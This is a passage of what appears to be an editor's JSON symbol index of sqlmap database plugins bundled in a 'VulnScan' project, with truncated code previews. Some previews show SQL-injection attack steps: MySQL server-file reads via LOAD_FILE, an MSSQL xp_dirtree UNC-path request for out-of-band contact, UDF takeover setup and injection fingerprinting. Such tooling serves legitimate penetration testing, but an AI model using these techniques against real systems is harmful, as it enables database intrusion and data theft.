        "detail": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on HSQLDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on HSQLDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on HSQLDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.hsqldb.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.informix.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.informix.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/ibmdb/python-ibmdb\n    User guide: https://github.com/ibmdb/python-ibmdb/wiki/README\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Apache License 2.0\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        try:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.informix.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.informix.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.informix.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def searchDb(self):\n        warnMsg = \"on Informix searching of databases is not implemented\"\n        logger.warning(warnMsg)\n        return []\n    def searchTable(self):\n        warnMsg = \"on Informix searching of tables is not implemented\"\n        logger.warning(warnMsg)\n        return []\n    def searchColumn(self):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.informix.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.informix.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.informix.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.informix.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.informix.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.informix.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.INFORMIX)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.informix.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.informix.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.informix.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Backend.setVersion('12.10')\n        ['12.10']\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.informix.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.informix.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.informix.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def __init__(self):\n        self.__basedir = None\n        self.__datadir = None\n        GenericTakeover.__init__(self)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.informix.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on SAP MaxDB it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def __init__(self):\n        GenericEnumeration.__init__(self)\n        kb.data.processChar = lambda x: x.replace('_', ' ') if x else x\n    def getPasswordHashes(self):\n        warnMsg = \"on SAP MaxDB it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getDbs(self):\n        if len(kb.data.cachedDbs) > 0:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on SAP MaxDB reading of files is not supported\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on SAP MaxDB writing of files is not supported\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MAXDB)\n    def _versionCheck(self):\n        infoMsg = \"executing %s SYSINFO version check\" % DBMS.MAXDB\n        logger.info(infoMsg)\n        query = agent.prefixQuery(\"/* NoValue */\")\n        query = agent.suffixQuery(query)\n        payload = agent.payload(newValue=query)\n        result = Request.queryPage(payload)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n        return expression",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on SAP MaxDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on SAP MaxDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on SAP MaxDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.maxdb.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Mckoi it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Mckoi it is not possible to get the banner\"\n        logger.warning(warnMsg)\n        return None\n    def getCurrentUser(self):\n        warnMsg = \"on Mckoi it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n    def getCurrentDb(self):\n        warnMsg = \"on Mckoi it is not possible to get name of the current database\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Mckoi it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Mckoi it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MCKOI)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n        return expression",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Mckoi it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Mckoi it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Mckoi it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mckoi.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/mimersql/MimerPy\n    User guide: https://github.com/mimersql/MimerPy/blob/master/README.rst\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: MIT\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        try:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on MimerSQL it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getStatements(self):\n        warnMsg = \"on MimerSQL it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n        return []\n    def getRoles(self, *args, **kwargs):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MIMERSQL)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT UNICODE_CHAR(97)||UNICODE_CHAR(98)||UNICODE_CHAR(99)||UNICODE_CHAR(100)||UNICODE_CHAR(101)||UNICODE_CHAR(102)||UNICODE_CHAR(103)||UNICODE_CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"UNICODE_CHAR(%d)\" % _ for _ in getOrds(value))",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on MimerSQL it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on MimerSQL it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on MimerSQL it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mimersql.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/gijzelaerr/pymonetdb\n    User guide: https://pymonetdb.readthedocs.io/en/latest/index.html\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Mozilla Public License 2.0\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        try:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on MonetDB it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getStatements(self):\n        warnMsg = \"on MonetDB it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n        return []\n    def getPrivileges(self, *args, **kwargs):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MONETDB)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CODE(97)||CODE(98)||CODE(99)||CODE(100)||CODE(101)||CODE(102)||CODE(103)||CODE(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CODE(%d)\" % _ for _ in getOrds(value))",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on MonetDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on MonetDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on MonetDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.monetdb.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://www.pymssql.org/en/stable/\n    User guide: http://www.pymssql.org/en/stable/pymssql_examples.html\n    API: http://www.pymssql.org/en/stable/ref/pymssql.html\n    Debian package: python-pymssql\n    License: LGPL\n    Possible connectors: http://wiki.python.org/moin/SQL%20Server\n    Important note: pymssql library on your system MUST be version 1.0.2\n    to work, get it from http://sourceforge.net/projects/pymssql/files/pymssql/1.0.2/",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Microsoft SQL Server it is not possible to fetch \"\n        warnMsg += \"database users privileges, sqlmap will check whether \"\n        warnMsg += \"or not the database users are database administrators\"\n        logger.warning(warnMsg)\n        users = []\n        areAdmins = set()\n        if conf.user:\n            users = [conf.user]",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def _dataToScr(self, fileContent, chunkName):\n        fileLines = []\n        fileSize = len(fileContent)\n        lineAddr = 0x100\n        lineLen = 20\n        fileLines.append(\"n %s\" % chunkName)\n        fileLines.append(\"rcx\")\n        fileLines.append(\"%x\" % fileSize)\n        fileLines.append(\"f 0100 %x 00\" % fileSize)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MSSQL)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+CHAR(101)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+NCHAR(235)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def __init__(self):\n        self.spExploit = \"\"\n        GenericTakeover.__init__(self)\n    def uncPathRequest(self):\n        # inject.goStacked(\"EXEC master..xp_fileexist '%s'\" % self.uncPath, silent=True)\n        inject.goStacked(\"EXEC master..xp_dirtree '%s'\" % self.uncPath)\n    def spHeapOverflow(self):\n        \"\"\"\n        References:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mssqlserver.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mysql.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mysql.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/PyMySQL/PyMySQL\n    User guide: https://pymysql.readthedocs.io/en/latest/\n    Debian package: python3-pymysql\n    License: MIT\n    Possible connectors: http://wiki.python.org/moin/MySQL\n    \"\"\"\n    def connect(self):\n        self.initConnection()",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mysql.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mysql.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mysql.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mysql.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mysql.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mysql.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def nonStackedReadFile(self, rFile):\n        if not kb.bruteMode:\n            infoMsg = \"fetching file: '%s'\" % rFile\n            logger.info(infoMsg)\n        result = inject.getValue(\"HEX(LOAD_FILE('%s'))\" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)\n        return result\n    def stackedReadFile(self, remoteFile):\n        if not kb.bruteMode:\n            infoMsg = \"fetching file: '%s'\" % remoteFile",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mysql.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mysql.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mysql.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MYSQL)\n    def _commentCheck(self):\n        infoMsg = \"executing %s comment injection fingerprint\" % DBMS.MYSQL\n        logger.info(infoMsg)\n        result = inject.checkBooleanExpression(\"[RANDNUM]=[RANDNUM]/* NoValue */\")\n        if not result:\n            warnMsg = \"unable to perform %s comment injection\" % DBMS.MYSQL\n            logger.warning(warnMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mysql.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mysql.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mysql.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 0x6162636465666768 FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CONVERT(0x61626364c3ab666768 USING utf8) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mysql.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.mysql.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.mysql.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def __init__(self):\n        self.__basedir = None\n        self.__datadir = None\n        self.__plugindir = None\n        GenericTakeover.__init__(self)\n    def udfSetRemotePath(self):\n        self.getVersionFromBanner()\n        banVer = kb.bannerFp[\"dbmsVersion\"]\n        if banVer and LooseVersion(banVer) >= LooseVersion(\"5.0.67\"):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.mysql.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.oracle.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.oracle.connector",
